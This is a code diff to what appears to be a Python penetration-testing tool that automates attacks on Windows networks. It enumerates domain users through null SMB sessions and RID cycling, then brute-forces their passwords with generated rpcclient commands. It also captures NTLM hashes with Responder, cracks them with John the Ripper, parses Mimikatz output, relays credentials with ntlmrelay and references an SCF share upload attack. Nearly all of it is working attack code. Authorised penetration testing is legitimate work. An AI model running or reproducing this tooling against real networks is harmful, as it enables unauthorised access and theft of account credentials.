@@ -18,11 +18,12 @@ from asyncio.subprocess import PIPE, STDOUT
 from netaddr import IPNetwork, AddrFormatError
 from libnmap.parser import NmapParser, NmapParserException
 from subprocess import Popen, PIPE, check_output, CalledProcessError
-# Prevent JTR error in VMWare
-os.environ['CPUID_DISABLE'] = '1'
 
 # debug
 from IPython import embed
+
+# Prevent JTR error in VMWare
+os.environ['CPUID_DISABLE'] = '1'
 
 def parse_args():
     # Create the arguments
@@ -339,21 +340,31 @@ def print_domains(null_sess_hosts):
         for d in uniq_doms:
             print('[+] Domain found: ' + d) 
 
-def get_usernames(ridenum_output):
+def get_usernames(ridenum_output, prev_users):
+    '''
+    Gets usernames from ridenum output
+    ip_users is dict that contains username + IP info
+    prev_users is just a list of the usernames to prevent duplicate bruteforcing
+    '''
     ip_users = {}
+
     for host in ridenum_output:
         out_lines = host.splitlines()
         ip = out_lines[0]
         for line in out_lines:
                                           # No machine accounts
             if 'Account name:' in line and "$" not in line:
-                user = line.split()[2]
-                if ip in ip_users:
-                    ip_users[ip] += [user]
-                else:
-                    ip_users[ip] = [user]
+                user = line.split()[2].strip()
+                if user not in prev_users:
+                    prev_users.append(user)
+                    print('[+] User found: ' + user)
 
-    return ip_users
+                    if ip in ip_users:
+                        ip_users[ip] += [user]
+                    else:
+                        ip_users[ip] = [user]
+
+    return ip_users, prev_users
 
 def write_to_file(filename, data, write_type):
     '''
@@ -366,24 +377,28 @@ def create_brute_cmds(ip_users, passwords):
     '''
     Creates the bruteforce commands
     ip_users = {ip:[user1,user2,user3]}
+    ip_users should already be unique and no in prev_users
     '''
-    already_tested = []
     cmds = []
 
     for ip in ip_users:
         for user in ip_users[ip]:
-            if user not in already_tested:
-                already_tested.append(user)
-                print('[+] User found: ' + user)
-                rpc_user_pass = []
-                for pw in passwords:
-                    cmd = "echo {} && rpcclient -U \"{}%{}\" {} -c 'exit'".format(ip, user, pw, ip)
-                    # This is so when you get the output from the coros
-                    # you get the username and pw too
-                    cmd2 = "echo '{}' ".format(cmd)+cmd
-                    cmds.append(cmd2)
+            rpc_user_pass = []
+            for pw in passwords:
+                cmd = "echo {} && rpcclient -U \"{}%{}\" {} -c 'exit'".format(ip, user, pw, ip)
+                # This is so when you get the output from the coros
+                # you get the username and pw too
+                cmd2 = "echo '{}' ".format(cmd)+cmd
+                cmds.append(cmd2)
 
     return cmds
+
+def log_users(user):
+    '''
+    Writes users found to log file
+    '''
+    with open('found-users.txt', 'a+') as f:
+        f.write(user+'\n')
 
 def create_passwords(args):
     '''
@@ -427,12 +442,11 @@ def create_season_pw():
     season_pw = season+year
     return season_pw
 
-def parse_brute_output(brute_output):
+def parse_brute_output(brute_output, prev_creds):
     '''
     Parse the chunk of rpcclient attempted logins
     '''
-    # prev_creds = ['ip\user:password', 'dom\user:password']
-    prev_creds = []
+    # prev_creds = ['ip\user:password', 'SMBv2-NTLMv2-SSP-1.2.3.4.txt']
     pw_found = False
 
     for line in brute_output:
@@ -443,7 +457,7 @@ def parse_brute_output(brute_output):
             ip = split[1]
             dom_user_pwd = split[5].replace('"','').replace('%',':')
             prev_creds.append(dom_user_pwd)
-            host_dom_user_pwd = ip+': '+dom_user_pwd
+            host_dom_user_pwd = ip+'\\'+dom_user_pwd
 
             duplicate = check_found_passwords(dom_user_pwd)
             if duplicate == False:
@@ -455,7 +469,7 @@ def parse_brute_output(brute_output):
 
     return prev_creds
 
-def smb_reverse_brute(loop, hosts, args, passwords):
+def smb_reverse_brute(loop, hosts, args, passwords, prev_creds, prev_users):
     '''
     Performs SMB reverse brute
     '''
@@ -463,11 +477,12 @@ def smb_reverse_brute(loop, hosts, args, passwords):
     null_sess_hosts = {}
     dom_cmd = 'rpcclient -U "" {} -N -c "lsaquery"'
     dom_cmds = create_cmds(hosts, dom_cmd)
+
     print('\n[*] Attack 1: RID cycling in null SMB sessions into reverse bruteforce')
     print('[*] Checking for null SMB sessions')
     print('[*] Example command that will run: '+dom_cmds[0].split('&& ')[1])
-    rpc_output = async_get_outputs(loop, dom_cmds)
 
+    rpc_output = async_get_outputs(loop, dom_cmds)
     if rpc_output == None:
         print('[-] Error attempting to look up null SMB sessions')
         return
@@ -485,6 +500,7 @@ def smb_reverse_brute(loop, hosts, args, passwords):
         for ip in null_sess_hosts:
             print('[+] Null session found: {}'.format(ip))
             null_hosts.append(ip)
+
     print_domains(null_sess_hosts)
 
     # Gather usernames using ridenum.py
@@ -497,8 +513,8 @@ def smb_reverse_brute(loop, hosts, args, passwords):
         print('[-] No usernames found')
         return
 
-    # {ip:username, username2], ip2:[username, username2]}
-    ip_users = get_usernames(ridenum_output)
+    # {ip:[username, username2], ip2:[username, username2]}
+    ip_users, prev_users = get_usernames(ridenum_output, prev_users)
 
     # Creates a list of unique commands which only tests
     # each username/password combo 2 times and not more
@@ -507,9 +523,9 @@ def smb_reverse_brute(loop, hosts, args, passwords):
     brute_output = async_get_outputs(loop, brute_cmds)
 
     # Will always return at least an empty dict()
-    prev_creds = parse_brute_output(brute_output)
+    prev_creds = parse_brute_output(brute_output, prev_creds)
 
-    return prev_creds
+    return prev_creds, prev_users
 
 def log_pwds(host_user_pwds):
     '''
@@ -589,9 +605,10 @@ def get_resp_hashes(prev_creds):
     '''
     Checks the responder log folder for hashes found
     '''
+    hashes = {}
     logdir_path = os.getcwd()+'/submodules/Responder/logs'
     resp_log_files = os.listdir(logdir_path)
-    hashes = {}
+
     for f in resp_log_files:
         if '-NTLM' in f:
             hash_path = logdir_path+'/'+f
@@ -657,28 +674,38 @@ def crack_hashes(hashes, identifier):
 
     return procs
 
+def parse_john_show(out, prev_creds):
+    '''
+    Parses "john --show output"
+    '''
+    for line in out.splitlines():
+        line = line.decode('utf8')
+        line = line.split(':')
+        if len(line) > 3:
+            user = line[0]
+            pw = line[1]
+            host = line[2]
+            host_user_pwd = host+'\\'+user+':'+pw
+            if host_user_pwd not in prev_creds:
+                prev_creds.append(host_user_pwd)
+                duplicate = check_found_passwords(host_user_pwd)
+                if duplicate == False:
+                    print('[!] Password found! '+host_user_pwd)
+                    log_pwds([host_user_pwd])
+
+    return prev_creds
+
 def get_cracked_pwds(prev_creds):
     '''
     Check for new cracked passwords
     '''
     dir_contents = os.listdir(os.getcwd())
+
     for x in dir_contents:
         if re.search('NTLMv(1|2)-hashes-.*\.txt', x):
             out = check_output('submodules/JohnTheRipper/run/john --show {}'.format(x).split())
-            for line in out.splitlines():
-                line = line.decode('utf8')
-                line = line.split(':')
-                if len(line) > 3:
-                    user = line[0]
-                    pw = line[1]
-                    host = line[2]
-                    host_user_pwd = host+'\\'+user+':'+pw
-                    if host_user_pwd not in prev_creds:
-                        prev_creds.append(host_user_pwd)
-                        duplicate = check_found_passwords(host_user_pwd)
-                        if duplicate == False:
-                            print('[!] Password found! '+host_user_pwd)
-                            log_pwds([host_user_pwd])
+            prev_creds = parse_john_show(out, prev_creds)
+
     return prev_creds
 
 def check_found_passwords(host_user_pwd):
@@ -802,18 +829,12 @@ def parse_mimikatz(prev_creds, mimi_data, line):
 
     return prev_creds, mimi_data
 
-def get_and_crack_resp_hashes(args, prev_creds, prev_lines, identifier, passwords, loop):
+def print_responder_out(prev_lines):
     '''
     Gets and cracks responder hashes
     Avoids getting and cracking previous hashes
     '''
     new_lines = []
-    ip = None
-
-    if 'crack' not in args.skip.lower():
-        prev_creds, hashes = get_resp_hashes(prev_creds)
-        john_proc = crack_hashes(hashes, identifier)
-        prev_creds = get_cracked_pwds(prev_creds)
 
     # Print responder-session.log output so we know it's running
     path = 'submodules/Responder/logs/Responder-Session.log'
@@ -825,39 +846,42 @@ def get_and_crack_resp_hashes(args, prev_creds, prev_lines, identifier, password
                     new_lines.append(line)
                     line = line.strip()
                     print('    [Responder] '+line)
-                    ip = parse_responder_lines(line, ip, passwords, loop)
 
-    # We don't want a separate john proc for each hash so we wait 10s between checks
-    time.sleep(10)
+    return new_lines
 
-    return prev_creds, new_lines
-
-def parse_responder_lines(line, ip, passwords, loop):
+def parse_responder_line(line, ip, passwords, loop, prev_creds, prev_users):
     '''
     Parse responder to get usernames and IPs for 2 pw bruteforcing
     '''
     client_id = ' Client   : '
-    username_id = ' Username : '
+    user_id = ' Username : '
 
     if ip:
-        if username_id in line:
-            username = line.split(username_id)[-1].strip()
-            ip_user = {ip:[username]}
+
+        if user_id in line:
+            # user = 'DOM\username'
+            user = line.split(user_id)[-1].strip()
+
+            if user not in prev_users: 
+                prev_users.append(user)
+                print('[+] User found: ' + user)
+                ip_user = {ip:[user]}
+
+                cmd = create_brute_cmds(ip_user, passwords)
+                brute_output = async_get_outputs(loop, cmd)
+                prev_creds = parse_brute_output(brute_output, prev_creds)
+
             ip = None
-            cmd = create_brute_cmds(ip_user, passwords)
-            brute_output = async_get_outputs(loop, cmd)
-            # Will always return at least an empty dict()
-            prev_creds = parse_brute_output(brute_output)
 
         else:
-            print('[-] Error parsing Responder-Session.log: IP found in previous line this line is not " Username : xxx"')
+            print('[-] Error parsing Responder-Session.log: IP found in previous line yet this line is not " Username : xxx"')
 
     if client_id in line:
         ip = line.split(client_id)[-1].strip()
 
-    return ip
+    return prev_creds, prev_users, ip
 
-def cleanup_resp(resp_proc, prev_creds):
+def cleanup_responder(resp_proc, prev_creds):
     '''
     Kill responder and move the log file
     '''
@@ -934,7 +958,7 @@ def do_ntlmrelay(identifier, prev_creds, args):
         print('\n[-] CTRL-C caught, cleaning up and closing')
 
         # Kill procs
-        cleanup_resp(resp_proc, prev_creds)
+        cleanup_responder(resp_proc, prev_creds)
         ntlmrelay_proc.kill()
 
         # Cleanup hash files
@@ -1038,10 +1062,11 @@ def main(report, args):
         Hash cracking
     '''
     prev_creds = []
-    prev_creds = []
-    loop = asyncio.get_event_loop()
-    passwords = create_passwords(args)
+    prev_users = []
     identifier = ''.join(random.choice(string.ascii_letters) for x in range(5))
+    loop = asyncio.get_event_loop()
+
+    passwords = create_passwords(args)
 
     # Returns a list of Nmap object hosts
     # So you must use host.address, for example, to get the ip
@@ -1059,7 +1084,7 @@ def main(report, args):
 
         # ATTACK 1: RID Cycling into reverse bruteforce
         if 'rid' not in args.skip.lower():
-            prev_creds = smb_reverse_brute(loop, hosts, args, passwords)
+            prev_creds, prev_users = smb_reverse_brute(loop, hosts, args, passwords, prev_creds, prev_users)
 
         # ATTACK 2: SCF file upload to writeable shares
         parse_nse(hosts, args)
@@ -1079,12 +1104,25 @@ def main(report, args):
         timeout = time.time() + 60 * int(args.respondertime)
         try:
             while time.time() < timeout:
-                prev_creds, new_lines = get_and_crack_resp_hashes(args, prev_creds, prev_lines, identifier, passwords, loop)
-                prev_lines += new_lines
-            prev_creds = cleanup_resp(resp_proc, prev_creds)
+                if 'crack' not in args.skip.lower():
+                    prev_creds, new_hashes = get_resp_hashes(prev_creds)
+                    john_proc = crack_hashes(new_hashes, identifier)
+                    prev_creds = get_cracked_pwds(prev_creds)
+
+                # Prints output and bruteforces Responder-found users
+                new_lines = print_responder_out(prev_lines)
+                ip = None
+                for line in new_lines:
+                    prev_lines.append(line)
+                    prev_creds, prev_users, ip = parse_responder_line(line, ip, passwords, loop, prev_creds, prev_users)
+
+                time.sleep(0.5)
+
+            prev_creds = cleanup_responder(resp_proc, prev_creds)
+
         except KeyboardInterrupt:
             print('\n[-] Killing Responder.py and moving on')
-            prev_creds = cleanup_resp(resp_proc, prev_creds)
+            prev_creds = cleanup_responder(resp_proc, prev_creds)
             # Give responder some time to die with dignity
             time.sleep(2)
 
@@ -1098,3 +1136,8 @@ if __name__ == "__main__":
         exit('[-] Run as root')
     report = parse_nmap(args)
     main(report, args)
+
+# Left off
+# Change responder hash-finding to read Responder-Session.log and not the hash file
+# Multiple hashes get stored in the hashfile so just continually checking for new hash files
+# wont work at all on new hashes written to the same file
